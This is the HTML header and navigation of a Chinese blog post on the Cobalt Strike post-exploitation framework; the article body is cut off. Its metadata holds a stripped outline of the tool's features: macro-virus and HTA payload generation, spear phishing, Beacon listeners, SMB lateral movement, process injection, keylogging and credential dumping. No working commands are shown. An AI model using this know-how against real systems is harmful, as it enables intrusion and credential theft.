<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>CobaltStrike渗透框架 | 嘻哈磕碜のBlogs</title><meta name="author" content="hihopkc"><meta name="copyright" content="hihopkc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="CobaltStrike渗透框架"><meta name="application-name" content="CobaltStrike渗透框架"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="CobaltStrike渗透框架"><meta property="og:url" content="https://hihopkc.github.io/posts/16261.html"><meta property="og:site_name" content="嘻哈磕碜のBlogs"><meta property="og:description" content="CobaltStrike渗透框架CobaltStrike框架介绍CobaltStrike简介Cobalt Strike（简称为CS）是一款团队作战渗透测试神器，是一种可以用来进行横向移动、数据窃取、鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可以连接多个服务端，一个服务端也可以对应多个客户"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308071816899.png"><meta property="article:author" content="hihopkc"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202308071816899.png"><meta name="description" content="CobaltStrike渗透框架CobaltStrike框架介绍CobaltStrike简介Cobalt Strike（简称为CS）是一款团队作战渗透测试神器，是一种可以用来进行横向移动、数据窃取、鱼叉式钓鱼的后渗透工具，分为客户端和服务端，一个客户端可以连接多个服务端，一个服务端也可以对应多个客户"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://hihopkc.github.io/posts/16261"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"tianli","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"00af80c1b4c617346c21","Referer":"https://hihopkc.github.io/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: 'https://hihopkc.space/',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: {"apiurl":"https://www.hihopkc.site/"},
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"R27EJ0K44Q","apiKey":"2631264c2276b5498f37a67d587bc878","indexName":"Demo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hihopkc","link":"链接: ","source":"来源: 嘻哈磕碜のBlogs","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#425AEF","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '嘻哈磕碜のBlogs',
  title: 'CobaltStrike渗透框架',
  postAI: '',
  pageFillDescription: 'CobaltStrike渗透框架, CobaltStrike框架介绍, CobaltStrike简介, CobaltStrike 目录结构, CobaltStrike基本使用, CS安装, CS启动, CS工具栏, CS菜单, View菜单, Playloads菜单, HTML Application, VBScript脚本基础, HTML Application, MS Office Macro, Payload Generator, Windows Executable, Windows Executable(s), Web Drive-by, Spear Phish, Reporting菜单, Help菜单, Beacon右键菜单, CobaltStrike监听器详解, Beacon介绍, Beacon分类, Beacon使用, Beacon工作原理, Beacon HTTPx2FHTTPS, Beacon DNS, Beacon SMB, 上线目标主机shell, 创建SMB监听器, 派生SMB Beacon会话, 进程注入SMB Beacon, 上线不出网主机, 连接与断开连接, Beacon TCP, 创建TCP监听器, CS生成Payload, 目标主机执行, 连接上线Beacon, Beacon命令, 补充资料渗透框架框架介绍简介简称为是一款团队作战渗透测试神器是一种可以用来进行横向移动数据窃取鱼叉式钓鱼的后渗透工具分为客户端和服务端一个客户端可以连接多个服务端一个服务端也可以对应多个客户端连接目录结构此证书用来加密和客户端通信带有默认而且比较敏感建议自己生成一个包含很多参数用于自定义用于验证屏幕截图和回调数据的设置基本使用安装运行环境配置安装安装下载公共账号密码环境变量配置启动启动服务端给与权限启动客户端别名用户名服务端地址服务端地址可为域名服务端口号默认可进行修改用户名可随意填写只要不冲突即可登录密码启动服务端时设置的密码工具栏连接服务端断开当前服务端连接配置监听器展示会话列表展示视图列表展示目标列表查看从靶机获取的账户密码查看从靶机下载的文件查看键盘记录查看屏幕截图生成无状态的木马开启服务为自签名提供运行环境生成宏病毒文件开启服务供下载和执行开启服务供下载文件管理服务帮助文档关于菜单进行另外一个连接支持连接多个服务器端设置界面控制台以及输出报告样式连接记录主要展示输出结果的形式设置接口创建一个脚本管理退出连接菜单显示受害主机的应用信息浏览器版本信息显示所有已获取的受害主机的凭证如使用获取到的密码凭证信息查看已下载文件主机上线记录以及团队协作聊天记录查看键盘记录结果查看代理模块查看所有屏幕截图脚本控制台加载第三方脚本以增强功能显示所有受害主机所有访问服务的日志记录菜单脚本基础是微软公司出品的脚本语言是默认使用的脚本语言声明变量声明一个变量变量用于保存值或表达式变量赋值可以为某个变量赋值如下所示变量名是在表达式的左侧需要赋给变量的值在表达式的右侧函数程序是一系列的语句被封装在和语句内可执行某些操作并会返回值可带有通过程序调用来向其传递的参数如果没有参数必须带有空的圆括号通过向函数程序名赋值的方式可使其返回值或者调用程序条件语句条件语句用于根据不同的情况执行不同的操作在中我们可以使用四种条件语句语句假如您希望在条件为时执行一系列的代码可以使用这个语句语句假如您希望执行两套代码其中之一可以使用这个语句语句假如您希望选择多套代码之一来执行可以使用这个语句语句假如您希望选择多套代码之一来执行可以使用这个语句循环语句循环语句用于运行相同的代码块指定的次数在中我们可以使用四种循环语句语句运行一段代码指定的次数语句针对集合中的每个项目或者数组中的每个元素来运行某段代码语句运行循环当条件为或者直到条件为时语句不要使用这个语句请使用语句代替它生成一个网页三种执行模式是以十六进制的方式内嵌一个到里运行时会把释放到磁盘然后创建进程运行调用执行通过调用组件来执行请确保目标机有组件否则会运行失败注组件源自介绍生成宏病毒文件将代码放到宏里面另存为启用宏的文档受害者点击启用内容即可上线生成各类语言的各种语言是一种对象它可以在文件中嵌入脚本代码并在客户端的浏览器中执行当浏览器打开页面时会被自动加载和执行以便在客户端上运行脚本生成文件注意不要勾选命令用于注册组件是系统提供的用来向系统注册控件或者卸载控件的命令以命令行方式运行执行本地获取反向执行远程获取反向把文件托管到服务器或者使用的功能使用如下方法加载执行上线生成一句话命令原始无特殊格式配合框架使用的生成分阶段的攻击载荷生成不分阶段独立的攻击载荷生成可执行文件还有以及动态链接库对开启的服务进行管理克隆网站可以记录受害者提交的数据提供一个文件下载可以修改信息为提供服务以便下载和执行类似于的使用自签名的程序进行钓鱼攻击该方式已过时自动检测版本并进行攻击针对以下以及以下版本用来获取一些系统信息比如系统版本版本浏览器版本等用来邮件钓鱼的模块鱼叉钓鱼攻击主要管理我们所创建的以及各类管理地址克隆网站还可以通过克隆的网站实现钓鱼设置当输入后回车会跳转到正常的网页上以免被发现设置记录目标键盘输入提供一个文件下载服务可以修改信息开启一个服务托管并根据选择的类型生成一个命令行来执行上线分析目标使用什么浏览器以及版本还有内部这里可以前期信息收集所用因为这种方法杀软以及浏览器是无法检测出来的可以通过水坑式攻击来获取目标所用的软件以及操作系统来针对性的攻击邮件钓鱼菜单本报告显示了此次参与的时间表此报告显示了在此次参与期间收集的主机信息本报告记录了在此次攻击中产生的妥协指标此报告逐个会话地记录活动本报告记录了此项目的社会工程部分这份报告将的行动映射到的对抗战术技术和常识矩阵此操作将清除的数据模型将丢失收集的所有信息将无法取回这些信息导出数据菜单访问主页进入页面进入页面查看使用的配置文件提供有关客户端和服务器的信息关于查看版本相关信息右键菜单打开会话获取提权生成黄金票据注入当前会话凭证转换运行用其他用户生成侦听器劫持目标浏览器进程桌面交互文件浏览器命令端口扫描进程列表截图代理服务反向端口转发部署外部监听器如指派给获取权限备注删除指定被控端休眠时间默认秒一次回传退出监听器详解介绍是运行在目标主机上的在隐蔽信道上我们提供服务用于长期控制受感染主机它的工作方式与类似在实际渗透过程中我们可以将其嵌入到可执行文件添加到文档或者通过利用主机漏洞来传递在目标主机上运行之后会主动向我们提前设置好的发送请求信息控制器接收到请求后会检查是否有待执行的任务如果有就会将任务下发到执行默认的时间分类根据内置的分类可以将进行分类是用来接收请求信息的模块内部外部与其他工具联合使用时才会使用到一般用来派生会话到使用在目标上线后右键目标使用在中它的心跳默认是即时间为每一分钟目标主机与通信一次如果时间过长在下载文件时花费时间明显过长所以在测试时会把时间降低一点一般拿到后先执行修改到合适的睡眠时间根据实战环境来调节建议不要太快不然流量会很明显中不能直接输入命令比如要让目标机执行这条命令对应的命令是其他的命令可以在中输入查看命令帮助信息工作原理以或协议建立连接连接到控制器它会发起一个请求获取来自控制器的执行操作任务如果控制器有要执行的任务那么它会响应一组包含执行的所有任务的加密数据否则会返回到睡眠状态我们可以在配置中设置时间周期当执行任务后产生输出时会通过一个包含加密数据的请求发送给这个请求中包含任务运行后的输出如果没有输出那么就没有这个请求通常创建一个简单的监听器只需要配置以下选项即可监听器名字选择类型配置回连主机地址配置分阶段的请求地址仅当明确需要配合时有效配置回连的监听端口新增在通信时可以选择更多的轮询方案以逃避检测阻断回连主机策略配置文件用于自定义通信流量特征绑定监听端口实现端口重定向设置内层真实域名在使用域前置技术时使用为指定代理以协议流量建立连接回连的主机可以添加多个回连主机策略配置主机仅当明确需要配合时有效配置文件用于自定义通信流量特征绑定监听端口实现端口重定向指定服务器以协议流量建立连接适用于内网横向简介使用命名管道通过父级进行通讯当两个链接后子从父获取到任务并发送因为链接的使用命名管道进行通信此流量封装在协议中所以相对隐蔽绕防火墙时可能发挥奇效前提条件没有禁用连接和端口未使用防火墙等方式来阻止目标机器开启了相关的服务具有的主机必须接受端口上的连接只能链接由同一个实例管理的利用这种横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据上线目标主机创建一个监听器生成监听器木马文件目标主机执行后上线会话创建监听器可默认或自定义派生会话右键会话进入控制台执行的监听器名称命令执行成功后可以看到一个新的会话在地址后面带有字进程注入监听器打开指定的进程并将监听器生成的注入到进程中运行右键会话进入控制台执行命令查看主机所有进程信息获取你想要注入的进程然后执行如下命令命令执行成功后可以看到一个新的会话在地址后面带有字符上线不出网主机会话中转右键会话设置监听器进行会话中转转发监听器可以利用已攻陷的机器作为代理为其他会话的中转网络流量即内网其他机器可通过连接攻陷机器上线以上操作实际是在控制台执行了如下命令绑定端口转发目的主机转发目的端口绑定端口绑定目标主机上的指定端口当目标主机的绑定端口被访问时将与转发目的主机端口建立连接并使用在两个网络连接之间中继流量使用上一步创建的监听器生成木马文件利用上传到目标不出网主机通过计划任务等方式运行木马文件成功上线不出网主机的会话该会话为被动连接不操作的不会回连如果中转机会话断掉该会话也会断掉连接与断开连接在控制台可以使用命令断开连接使用重新连接目标地址地址断开与命名管道或的连接指定地址或地址以及会话来断开特定的连接目标管道名目标连接并建立控制通道所有对于的命令请求都将通过当前会话可以指定一个显式的管道名以连接到特定管道否则将使用当前配置文件中的默认管道名仅与父通信适用于内网横向移动命令格式同相似不过此处连接目标的命令不是而是取消连接目标机器的话对应的命令与同为创建监听器默认或自定义生成通过上一步创建的监听器生成的目标主机执行把上一步生成的上传到目标主机执行执行后会在目标主机监听配置监听器时配置的端口连接上线目标目标端口连接并建立控制通道所有对于的命令请求都将通过当前会话使用命令来断开命令匹配过程的欺骗参数阻止子进程中的非设置浏览器会话取消正在进行的下载变更目录清除队列通过连接到部署客户端复制文件从提取密码哈希查看目标桌面并与之交互将反射注入到进程中使用将加载到进程中下载文件列出正在进行的文件下载列出目标上的驱动器在提升权限的环境中生成会话在目标上执行程序无输出在目标内存中执行本地程序终止会话在当前令牌上启用系统特权尝试获得获取用户转储密码哈希帮助菜单在特定进程中产生会话在此会话中运行杀死长期运行的后渗透任务列出长期运行的后渗透任务在远程主机上生成会话将缓存中的应用于此会话清除本次会议中的将应用于此会话将键盘记录器注入进程杀死进程通过命名管道连接到使用转储凭证和哈希列出文件创建令牌以传递凭据运行命令创建目录将记录用作数据通道仅将记录用作数据通道仅将记录用作数据通道仅移动文件网络和主机枚举工具给分配一个注释扫描网络以查找开放服务通过执行命令通过执行命令导入脚本为产生的设置父显示进程列表在特定进程中执行命令使用进行哈希传递打印当前目录查询注册表在远程主机上运行命令恢复为原始令牌删除文件或文件夹设置反向端口转发在目标上执行程序返回输出以其他用户身份执行程序在提升权限的环境中执行程序在另一个下执行程序截屏设置环境变量通过执行命令将注入进程生成进程并将注入其中设置睡眠时间启动服务器以中继流量停止服务器产生一个会话以其他用户身份发起会话设置可执行文件以将进程生成为在另一个进程下产生会话使用在主机上生成一个会话使用在主机上生成一个会话从进程中窃取访问令牌将时间戳从一个文件应用到另一个文件与父断开连接上传文件补充资料',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-03-13 23:50:38',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">嘻哈磕碜のBlogs</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="wechat" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="alipay" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 1.05rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 1.05rem;">MSF<sup>1</sup></a><a href="/tags/Navicat/" style="font-size: 1.05rem;">Navicat<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">Web安全<sup>9</sup></a><a href="/tags/binwalk/" style="font-size: 1.05rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 1.05rem;">docker<sup>4</sup></a><a href="/tags/hash/" style="font-size: 1.05rem;">hash<sup>1</sup></a><a href="/tags/hydra/" style="font-size: 1.05rem;">hydra<sup>1</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>1</sup></a><a href="/tags/john/" style="font-size: 1.05rem;">john<sup>1</sup></a><a href="/tags/mysql/" style="font-size: 1.05rem;">mysql<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 1.05rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 1.05rem;">owasp<sup>1</sup></a><a href="/tags/phpstudy/" style="font-size: 1.05rem;">phpstudy<sup>1</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 1.05rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 1.05rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 1.05rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 1.05rem;">ssrf<sup>1</sup></a><a href="/tags/tomcat/" style="font-size: 1.05rem;">tomcat<sup>1</sup></a><a href="/tags/wpscan/" style="font-size: 1.05rem;">wpscan<sup>1</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 1.05rem;">容器<sup>1</sup></a><a href="/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/" style="font-size: 1.05rem;">弱口令<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 1.05rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.05rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">测试工具<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">8</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">14</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">十二月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">14</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">13</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">13</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">11</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" 